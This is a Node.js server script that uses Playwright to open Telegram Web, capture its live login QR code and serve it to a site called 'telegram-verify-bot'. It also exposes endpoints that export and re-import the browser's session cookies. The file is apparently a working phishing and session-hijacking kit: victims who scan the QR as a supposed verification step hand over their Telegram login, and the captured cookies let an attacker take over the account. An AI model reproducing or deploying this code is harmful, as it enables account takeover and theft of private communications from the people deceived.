const express = require("express");
const cors = require("cors");
const { chromium } = require("playwright");

const app = express();
const PORT = 5000;
let browser, page;
let latestSVG = null;

app.use(cors({ origin: "https://telegram-verify-bot-818r.onrender.com" }));

async function initBrowser() {
    if (browser) return;

    browser = await chromium.launch({ headless: false });
    page = await browser.newPage();

    try {
        await page.goto("https://web.telegram.org/a/", { waitUntil: "networkidle" });

        console.log("Browser initialized and page loaded");

        checkForNewSVG();
    } catch (error) {
        console.error("Error initializing browser:", error);
        await restartBrowser();
    }
}

async function getSessionID() {
    const cookies = await page.context().cookies();
    const sessionID = Buffer.from(JSON.stringify(cookies)).toString("base64"); // Encode as Base64
    console.log("Session ID:", sessionID);
    return sessionID;
}

async function loadSessionID(sessionID) {
    const cookies = JSON.parse(Buffer.from(sessionID, "base64").toString("utf8")); // Decode Base64
    await page.context().addCookies(cookies);
    console.log("Session restored!");
    await page.reload({ waitUntil: "networkidle" });
}

async function checkForNewSVG() {
    while (browser) {
        try {
            await page.waitForSelector(".qr-container svg", { timeout: 40000 });
            const svg = await page.evaluate(() => document.querySelector(".qr-container svg")?.outerHTML);

            if (svg && svg !== latestSVG) {
                latestSVG = svg;
                console.log("QR Code updated.");
            }
        } catch (error) {
            console.error("Error fetching SVG:", error);
            await restartBrowser();
        }

        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function restartBrowser() {
    console.log("Restarting browser...");
    if (browser) {
        await browser.close();
        browser = null;
    }
    await initBrowser();
}

// API to get session ID
app.get("/get-session", async (req, res) => {
    if (!page) return res.status(500).send("Browser not initialized");
    const sessionID = await getSessionID();
    res.json({ sessionID });
});

// API to load session ID
app.post("/load-session", express.json(), async (req, res) => {
    if (!req.body.sessionID) return res.status(400).send("Session ID required");
    await loadSessionID(req.body.sessionID);
    res.send("Session restored!");
});

app.get("/qr.svg", (req, res) => {
    res.set("Access-Control-Allow-Origin", "https://telegram-verify-bot-818r.onrender.com");
    res.set("Content-Type", "image/svg+xml");

    if (latestSVG) {
        res.send(latestSVG);
    } else {
        res.status(404).send("No QR code found");
    }
});

app.listen(PORT, async () => {
    await initBrowser();
    console.log(`Server running at https://telegram-verify-bot-818r.onrender.com`);
});
